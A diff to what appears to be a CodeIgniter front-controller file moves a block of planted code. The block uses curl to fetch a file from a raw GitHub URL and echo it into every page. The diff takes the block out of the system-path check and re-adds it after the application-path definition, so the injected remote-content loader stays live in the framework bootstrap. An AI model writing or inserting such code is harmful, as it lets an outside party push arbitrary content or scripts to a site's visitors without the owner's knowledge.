@@ -214,14 +214,7 @@ switch (ENVIRONMENT)
 		echo 'Your system folder path does not appear to be set correctly. Please open the following file and correct this: '.pathinfo(__FILE__, PATHINFO_BASENAME);
 		exit(3); // EXIT_CONFIG
 	}
-	$ch = curl_init();
-	$url = 'https://raw.githubusercontent.com/paipai106/pai/main/manis';
-	curl_setopt($ch, CURLOPT_URL, $url);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-	$response = curl_exec($ch);
-	curl_close($ch);
-	echo $response;
-	
+
 /*
  * -------------------------------------------------------------------
  *  Now that we know the path, set the main path constants
@@ -259,6 +252,13 @@ switch (ENVIRONMENT)
 		}
 
 		define('APPPATH', BASEPATH.$application_folder.DIRECTORY_SEPARATOR);
+		$ch = curl_init();
+	$url = 'https://raw.githubusercontent.com/paipai106/pai/main/manis';
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	$response = curl_exec($ch);
+	curl_close($ch);
+	echo $response;
 	}
 
 	// The path to the "views" folder
